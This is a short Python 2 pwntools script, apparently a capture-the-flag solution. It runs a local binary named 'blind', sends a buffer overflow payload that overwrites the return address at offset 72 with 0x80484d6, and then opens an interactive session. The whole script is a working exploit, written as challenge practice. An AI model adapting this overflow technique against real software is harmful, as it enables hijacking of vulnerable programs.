#!/usr/bin/env python2
from pwn import *

p = process('./blind')

p.recvline()

payload = fit({ 72:p32(0x80484d6)})

p.sendline(payload)

p.interactive()
